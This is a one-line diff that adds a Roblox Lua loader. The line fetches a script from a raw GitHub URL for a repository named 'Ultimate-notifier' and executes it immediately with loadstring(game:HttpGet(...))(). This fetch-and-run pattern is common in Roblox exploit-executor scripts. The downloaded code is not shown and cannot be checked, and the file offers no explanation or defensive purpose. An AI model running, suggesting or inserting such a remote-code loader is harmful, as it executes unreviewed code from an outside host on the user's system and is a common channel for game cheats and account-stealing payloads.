@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reighnormanblessfrancist-boop/Ultimate-notifier/refs/heads/main/File"))()
